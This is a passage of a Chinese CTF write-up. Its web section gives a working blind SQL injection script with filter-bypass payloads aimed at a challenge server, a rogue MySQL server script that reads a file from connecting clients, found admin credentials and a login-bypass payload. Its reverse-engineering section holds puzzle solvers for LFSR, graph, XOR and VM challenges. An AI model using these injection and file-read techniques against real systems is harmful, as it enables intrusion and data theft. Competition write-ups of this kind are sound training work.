<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line">hhp = hackhttp.hackhttp()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'''POST /search.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 121.37.179.47:1001</span></span><br><span class="line"><span class="string">Content-Length: 60</span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string">Origin: http://121.37.179.47:1001</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Referer: http://121.37.179.47:1001/search.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=tm931kor7tr5qnhd641nb9qrg7; username=6620aef2bb0988189fc2e05465b2c4d1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">"flag=1'or ascii(substr((selselectect flag frfromom fl4g),&#123;&#125;,1))&gt;&#123;&#125;%23"</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    tmp = len(res) </span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">31</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        data = str1.format(str2.format(i,mid))</span><br><span class="line">        code, head, html, redirect, log = hhp.http(url, raw=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'!'</span> <span class="keyword">in</span>  html:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    res += chr(int(mid))</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span>: </span><br><span class="line">        print(res[:<span class="number">-1</span>])</span><br><span class="line">        print(<span class="string">'emm.......'</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
<p>只能跑出一半的flag。<br>发现数据库username表里有admin用户.</p>
<p>账户:admin；密码:whoamiadmin，登陆进去有个<code>database.php</code>，猜测应该是利用Rouge Mysql读取另外一半flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/var/www/html/flag.php"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3309</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>flag另外一半在注释里面，拼接即可：flag{Rogue-MySql-Server-is-nday}</p>
<h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>原题。<br>payload: password=’-0-‘</p>
<blockquote>
<p>flag{ysffXdKecK8pmCEk}</p>
</blockquote>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="clock"><a href="#clock" class="headerlink" title="clock"></a>clock</h2><p>非线性反馈移位寄存器，强网杯2018 streamgame3改的，改改脚本可用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R, mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i = (R &amp; mask) &amp; <span class="number">0xffffff</span></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1, R1_mask, R2, R2_mask, R3, R3_mask)</span>:</span></span><br><span class="line">    (R1_NEW, x1) = lfsr(R1, R1_mask)</span><br><span class="line">    (R2_NEW, x2) = lfsr(R2, R2_mask)</span><br><span class="line">    (R3_NEW, x3) = lfsr(R3, R3_mask)</span><br><span class="line">    <span class="keyword">if</span>(x1&amp;<span class="number">1</span>):</span><br><span class="line">        out = x3</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out = x2</span><br><span class="line">    <span class="keyword">return</span> (R1_NEW, R2_NEW, R3_NEW, out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R1_mask = <span class="number">0x17fa06</span></span><br><span class="line">R2_mask = <span class="number">0x2a9a0d</span></span><br><span class="line">R3_mask = <span class="number">0x5e5e6a</span></span><br><span class="line">n1 = <span class="number">21</span></span><br><span class="line">n2 = <span class="number">22</span></span><br><span class="line">n3 = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(beg, end, num, mask)</span>:</span></span><br><span class="line">    ansn = range(beg, end)</span><br><span class="line">    data = open(<span class="string">'./output'</span>).read(num)</span><br><span class="line">    data = <span class="string">''</span>.join(bin(<span class="number">256</span> + ord(c))[<span class="number">3</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> data)</span><br><span class="line">    now = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ansn:</span><br><span class="line">        r = i</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(num * <span class="number">8</span>):</span><br><span class="line">            r, lastbit = lfsr(r, mask)</span><br><span class="line">            lastbit = str(lastbit)</span><br><span class="line">            cnt += (lastbit == data[j])</span><br><span class="line">        <span class="keyword">if</span> cnt &gt; now:</span><br><span class="line">            now = cnt</span><br><span class="line">            res = i</span><br><span class="line">            <span class="keyword">print</span> now, res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce2</span><span class="params">(y, z)</span>:</span></span><br><span class="line">    data = open(<span class="string">'./output'</span>).read(<span class="number">50</span>)</span><br><span class="line">    data = <span class="string">''</span>.join(bin(<span class="number">256</span> + ord(c))[<span class="number">3</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> data)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(pow(<span class="number">2</span>, n1 - <span class="number">1</span>), pow(<span class="number">2</span>, n1)):</span><br><span class="line">        R1, R2, R3 = x, y, z</span><br><span class="line">        flag = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">            (R1, R2, R3,</span><br><span class="line">             out) = single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask)</span><br><span class="line">            <span class="keyword">if</span> str(out) != data[i]:</span><br><span class="line">                flag = <span class="keyword">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> y % <span class="number">10000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'now: '</span>, x, y, z</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'ans: '</span>, hex(x)[<span class="number">2</span>:], hex(y)[<span class="number">2</span>:], hex(z)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R2 = guess(pow(<span class="number">2</span>, n2 - <span class="number">1</span>), pow(<span class="number">2</span>, n2), <span class="number">40</span>, R2_mask)</span><br><span class="line"><span class="keyword">print</span> R2</span><br><span class="line">R3 = guess(pow(<span class="number">2</span>, n3 - <span class="number">1</span>), pow(<span class="number">2</span>, n3), <span class="number">40</span>, R3_mask)</span><br><span class="line"><span class="keyword">print</span> R3</span><br><span class="line">R2 = <span class="number">3324079</span></span><br><span class="line">R3 = <span class="number">4958299</span></span><br><span class="line">bruteforce2(R2, R3)</span><br></pre></td></tr></table></figure>
<h2 id="cycle-graph"><a href="#cycle-graph" class="headerlink" title="cycle graph"></a>cycle graph</h2><p>图算法，先按可见字符过滤，后来猜测0-9，a-f，多个的穷举</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x00000034</span>, <span class="number">0x00403398</span>, <span class="number">0x0040338C</span>, <span class="number">0x00000002</span>, <span class="number">0x00403398</span>, <span class="number">0x004033E0</span>, <span class="number">0x0000002C</span>, <span class="number">0x0040338C</span>,</span><br><span class="line"><span class="number">0x004033D4</span>, <span class="number">0x0000002A</span>, <span class="number">0x00403458</span>, <span class="number">0x00403494</span>, <span class="number">0x00000006</span>, <span class="number">0x004033D4</span>, <span class="number">0x004033EC</span>, <span class="number">0x0000002A</span>,</span><br><span class="line"><span class="number">0x00403398</span>, <span class="number">0x00403464</span>, <span class="number">0x0000002F</span>, <span class="number">0x004034B8</span>, <span class="number">0x004034F4</span>, <span class="number">0x0000002A</span>, <span class="number">0x0040341C</span>, <span class="number">0x00403494</span>,</span><br><span class="line"><span class="number">0x00000033</span>, <span class="number">0x004033B0</span>, <span class="number">0x004033EC</span>, <span class="number">0x00000003</span>, <span class="number">0x004033F8</span>, <span class="number">0x0040341C</span>, <span class="number">0x00000002</span>, <span class="number">0x004033B0</span>,</span><br><span class="line"><span class="number">0x00403410</span>, <span class="number">0x00000032</span>, <span class="number">0x0040347C</span>, <span class="number">0x004034DC</span>, <span class="number">0x00000032</span>, <span class="number">0x00403428</span>, <span class="number">0x004033F8</span>, <span class="number">0x00000032</span>,</span><br><span class="line"><span class="number">0x0040338C</span>, <span class="number">0x004034A0</span>, <span class="number">0x00000030</span>, <span class="number">0x00403380</span>, <span class="number">0x004033EC</span>, <span class="number">0x00000003</span>, <span class="number">0x00403428</span>, <span class="number">0x004034A0</span>,</span><br><span class="line"><span class="number">0x00000001</span>, <span class="number">0x004033BC</span>, <span class="number">0x004034AC</span>, <span class="number">0x00000032</span>, <span class="number">0x004033D4</span>, <span class="number">0x004033EC</span>, <span class="number">0x0000002B</span>, <span class="number">0x004034D0</span>,</span><br><span class="line"><span class="number">0x004034B8</span>, <span class="number">0x00000002</span>, <span class="number">0x00403410</span>, <span class="number">0x004033A4</span>, <span class="number">0x0000002E</span>, <span class="number">0x004034D0</span>, <span class="number">0x00403488</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00403434</span>, <span class="number">0x004033C8</span>, <span class="number">0x00000002</span>, <span class="number">0x00403434</span>, <span class="number">0x0040344C</span>, <span class="number">0x0000002D</span>, <span class="number">0x00403398</span>, <span class="number">0x0040341C</span>,</span><br><span class="line"><span class="number">0x00000032</span>, <span class="number">0x00403440</span>, <span class="number">0x004033D4</span>, <span class="number">0x00000004</span>, <span class="number">0x00403494</span>, <span class="number">0x00403434</span>, <span class="number">0x0000002D</span>, <span class="number">0x004034E8</span>,</span><br><span class="line"><span class="number">0x00403470</span>, <span class="number">0x00000030</span>, <span class="number">0x00403494</span>, <span class="number">0x0040338C</span>, <span class="number">0x00000031</span>, <span class="number">0x00403464</span>, <span class="number">0x00403440</span>, <span class="number">0x0000002F</span>,</span><br><span class="line"><span class="number">0x004033EC</span>, <span class="number">0x004033B0</span>, <span class="number">0x00000033</span>, <span class="number">0x00403488</span>, <span class="number">0x00403404</span>, <span class="number">0x00000005</span>, <span class="number">0x004034F4</span>, <span class="number">0x004034F4</span>]</span><br><span class="line">node = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    </span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">1</span>] -= <span class="number">0x00403380</span></span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">1</span>] //= <span class="number">12</span></span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">2</span>] -= <span class="number">0x00403380</span></span><br><span class="line">    data[i*<span class="number">3</span>+<span class="number">2</span>] //= <span class="number">12</span></span><br><span class="line">    tmp = [data[<span class="number">3</span>*i], data[i*<span class="number">3</span>+<span class="number">1</span>], data[i*<span class="number">3</span>+<span class="number">2</span>]]</span><br><span class="line">    node.append(tmp)</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">delta = <span class="number">48</span></span><br><span class="line">res = []</span><br><span class="line">res.append(node[p][<span class="number">0</span>]+<span class="number">48</span>)</span><br><span class="line">delta = node[p][<span class="number">0</span>]+<span class="number">48</span></span><br><span class="line">p = node[p][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">digit = list(<span class="string">b"0123456789abcdef"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> delta + node[p][<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> digit:</span><br><span class="line">        delta = delta - node[p][<span class="number">0</span>]</span><br><span class="line">        res.append(delta)</span><br><span class="line">        p = node[p][<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> delta - node[p][<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> digit:</span><br><span class="line">        delta = delta + node[p][<span class="number">0</span>]</span><br><span class="line">        res.append(delta)</span><br><span class="line">        p = node[p][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(p, delta, node[p], i)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">            delta = delta + node[p][<span class="number">0</span>]</span><br><span class="line">            res.append(delta)</span><br><span class="line">            p = node[p][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">12</span>:</span><br><span class="line">            delta = delta - node[p][<span class="number">0</span>]</span><br><span class="line">            res.append(delta)</span><br><span class="line">            p = node[p][<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            delta = delta + node[p][0]</span></span><br><span class="line"><span class="string">            res.append(delta)</span></span><br><span class="line"><span class="string">            p = node[p][1]</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            delta = delta - node[p][0]</span></span><br><span class="line"><span class="string">            res.append(delta)</span></span><br><span class="line"><span class="string">            p = node[p][2]</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure>
<h2 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h2><p>smc，加密比较简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">17</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">3</span>, <span class="number">47</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">16</span>]</span><br><span class="line">key = list(<span class="string">b"Rising_Hopper!"</span>)</span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    plain.append(cipher[i]^key[i%<span class="number">14</span>])</span><br><span class="line">print(bytes(plain))</span><br><span class="line"><span class="comment"># Caucasus@s_ability</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">0x1EA272</span>, <span class="number">0x206FC4</span>, <span class="number">0x1D2203</span>, <span class="number">0x1EEF55</span>, <span class="number">2421009</span>, <span class="number">0x193A7C</span>, <span class="number">0x1F3C38</span>, <span class="number">2184813</span>, <span class="number">2302911</span>, <span class="number">2263545</span>, <span class="number">1909251</span>, <span class="number">2165130</span>, <span class="number">1968300</span>, <span class="number">2243862</span>, <span class="number">2066715</span>, <span class="number">2322594</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">1869885</span>, <span class="number">2066715</span>, <span class="number">2263545</span>, <span class="number">1869885</span>, <span class="number">964467</span>, <span class="number">944784</span>, <span class="number">944784</span>, <span class="number">944784</span>, <span class="number">728271</span>, <span class="number">1869885</span>, <span class="number">2263545</span>, <span class="number">2283228</span>, <span class="number">2243862</span>, <span class="number">2184813</span>, <span class="number">2165130</span>, <span class="number">2027349</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">1869885</span>, <span class="number">2283228</span>, <span class="number">2047032</span>, <span class="number">1909251</span>, <span class="number">2165130</span>, <span class="number">1869885</span>, <span class="number">2401326</span>, <span class="number">1987983</span>, <span class="number">2243862</span>, <span class="number">2184813</span>, <span class="number">885735</span>, <span class="number">2184813</span>, <span class="number">2165130</span>, <span class="number">1987983</span>, <span class="number">2460375</span>]</span><br><span class="line"></span><br><span class="line">mul = <span class="number">19683</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">51</span>):</span><br><span class="line">    res[i] //= mul</span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure>
<h2 id="easyparser"><a href="#easyparser" class="headerlink" title="easyparser"></a>easyparser</h2><p>虚拟机题，init和fini还有另外几部分虚拟机，加密比较简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = [<span class="number">0x90</span>, <span class="number">0x14C</span>, <span class="number">0x1C</span>, <span class="number">0xF0</span>, <span class="number">0x84</span>, <span class="number">0x3C</span>, <span class="number">0x18</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>, <span class="number">0x58</span>, <span class="number">0x2C</span>, <span class="number">0x8</span>, <span class="number">0x34</span>, <span class="number">0xF0</span>, <span class="number">0x114</span>, <span class="number">0xF0</span>, <span class="number">0x80</span>, <span class="number">0x2C</span>, <span class="number">0x28</span>, <span class="number">0x34</span>, <span class="number">0x8</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0x44</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x5C</span>, <span class="number">0x2C</span>, <span class="number">0x108</span>, <span class="number">0xF0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    res[i] &gt;&gt;= <span class="number">2</span></span><br><span class="line">    res[i] ^= <span class="number">0x63</span></span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure>
<h2 id="Rubik"><a href="#Rubik" class="headerlink" title="Rubik"></a>Rubik</h2><p>二阶魔方，两个int64存放面，每三个bit代表一面的颜色</p>
<p>构造各种输入得到三个bit对应的颜色和位置，用在线求解器求解</p>
<p><a href="http://rubiks-cube-solver.com/2x2/" target="_blank" rel="noopener">http://rubiks-cube-solver.com/2x2/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"># 0   0   0    4   4  3</span><br><span class="line"># 0   0   5    4   2  3</span><br><span class="line"># 0   0   3    0   2  2</span><br><span class="line"># 0   0   0    0   0  0</span><br><span class="line"># 5   5   2    5   4  4</span><br><span class="line"># 5   1   2    5   0  0</span><br><span class="line"># 5   1   3    5   5  5</span><br><span class="line"># 5   5   5    5   5  5</span><br><span class="line"># 4   5   1    4   4  4</span><br><span class="line"># 4   5   1    3   3  5</span><br><span class="line"># 4   4   4    3   3  1</span><br><span class="line"># 4   4   4    4   4  4</span><br><span class="line"># 3   3   0    3   5  5</span><br><span class="line"># 3   3   2    1   5  0</span><br><span class="line"># 3   3   5    1   1  1</span><br><span class="line"># 3   3   5    3   3  3</span><br><span class="line"># 2   4   0    2   2  3</span><br><span class="line"># 2   4   3    2   3  1</span><br><span class="line"># 2   2   3    2   1  2</span><br><span class="line"># 2   2   2    2   2  2</span><br><span class="line"># 1   1   4    0   0  4</span><br><span class="line"># 1   2   4    0   1  2</span><br><span class="line"># 1   2   1    1   1  1</span><br><span class="line"># 1   1   1    1   0  0</span><br><span class="line">    # U   FUUF R   RF RFR</span><br><span class="line"></span><br><span class="line"># 0 white</span><br><span class="line"># 1 orange</span><br><span class="line"># 2 blue</span><br><span class="line"># 3 yellow</span><br><span class="line"># 4 red</span><br><span class="line"># 5 green</span><br><span class="line"></span><br><span class="line">       # 15 14</span><br><span class="line">       # 12 13</span><br><span class="line">       </span><br><span class="line"># 06 05  22 21  17 16  09 08</span><br><span class="line"># 07 04  23 20  18 19  10 11</span><br><span class="line"></span><br><span class="line">       # 02 01</span><br><span class="line">       # 03 00</span><br></pre></td></tr></table></figure>
